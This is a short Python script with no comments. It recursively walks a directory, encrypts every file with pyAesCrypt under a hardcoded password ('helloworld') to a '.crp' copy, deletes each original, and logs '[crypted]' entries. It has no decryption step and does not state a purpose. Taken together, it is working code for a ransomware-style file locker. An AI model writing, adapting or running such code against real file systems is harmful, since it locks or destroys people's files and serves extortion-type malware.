import os, sys
def crypt(file):
	global result
	import pyAesCrypt
	result.append("--------------------------------------------------------------- \n \n" )
	password="helloworld"
	bufferSize = 512*1024
	pyAesCrypt.encryptFile(str(file), str(file)+".crp", password, bufferSize)
	result.append("[crypted] '"+str(file)+".crp' \n \n")
	os.remove(file)
def walk(dir):
	global result
	for name in os.listdir(dir): 
		path = os.path.join(dir, name)
		if os.path.isfile(path):
			crypt(path)
		else:
			walk(path)
def initialisation(path):
	global result
	result = []
	walk(path)
	result.append("--------------------------------------------------------------- \n \n" )
	return " ".join(result)
